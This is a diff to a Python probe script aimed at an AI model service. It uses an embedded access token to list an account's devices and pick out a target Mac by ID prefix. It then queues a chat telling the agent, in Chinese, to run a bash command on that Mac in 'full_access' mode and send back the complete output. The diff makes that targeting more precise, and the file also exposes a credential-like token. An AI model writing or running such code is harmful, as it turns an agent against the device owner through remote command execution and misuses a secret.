@@ -8,7 +8,8 @@ BRIAN = "usr_j7t9Dhq4M4obQkag5huJi"
 TOKEN = "gho_w5O107fup8ULp6tE" "FsW9V3QEEXSHtx3m9xka"
 UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 HOST = "assistant.lumiiai.cn"
-MAC = "desktop-69af31ff6f"
+MAC_PREFIX = "desktop-69af"
+MAC = None
 X5B64 = open(os.path.join(os.path.dirname(__file__), "x5b64.txt")).read().strip()
 
 LOG = []
@@ -90,14 +91,19 @@ def main():
         except Exception:
             devs=[]; log("DEV_ERR", st, bod[:120]); 
         fr=[]
+        fullids=[]
         for d in devs:
             if isinstance(d,dict):
-                fr.append((d.get("name"),(d.get("id") or "")[:18],bool(d.get("online")),d.get("lastSeenAt")))
-        frames.append(fr)
-        mac=[x for x in fr if x[1].startswith(MAC[:18])]
+                did=d.get("id") or ""
+                fullids.append({"name":d.get("name"),"id":did,"online":bool(d.get("online")),"lastSeenAt":d.get("lastSeenAt")})
+                if did.startswith(MAC_PREFIX):
+                    globals()["MAC"]=did
+        log("FULLIDS", json.dumps(fullids,ensure_ascii=False)[:1500])
+        frames.append(fullids)
+        mac=[x for x in fullids if x["id"].startswith(MAC_PREFIX)]
         log("FRAME%d"%i, time.strftime("%H:%M:%SZ",time.gmtime()),
             "n=%d online=%d"%(len(fr),sum(1 for x in fr if x[2])),
-            json.dumps(mac,ensure_ascii=False)[:200])
+            json.dumps(mac,ensure_ascii=False)[:260])
         time.sleep(18)
     # persistent chat queue attempt (executes whenever Mac next connects) -- OFF by default to avoid contending with probe13
     assistants = get_assistants(ck)
@@ -105,7 +111,7 @@ def main():
     cmd = make_cmd()
     msg = ("请在你当前所在的这台 Mac 上直接执行下面这条命令（bash），不要修改、不要省略，把完整的标准输出原文回复给我：\n\n```\n%s\n```" % cmd)
     queued=None
-    if assistants:
+    if assistants and MAC:
         a=assistants[0]
         stc,bodc = http("POST","/api/conversations",
             json.dumps({"title":"诊断","assistantId":a,"participants":[]}),cookie=ck)
@@ -113,7 +119,7 @@ def main():
         try: cid=json.loads(bodc)["conversation"]["id"]
         except Exception: pass
         log("CONV", stc, str(bodc)[:140].replace("\n"," "), "cid=",cid)
-        if cid:
+        if cid and MAC:
             std,bodd = http("POST","/api/agents/%s/chat"%a, json.dumps({
                 "sessionId":cid,"message":msg,"assistantId":a,
                 "execution_target":{"deviceId":MAC,"workspaceHandle":None,"mode":"full_access"}}),cookie=ck)
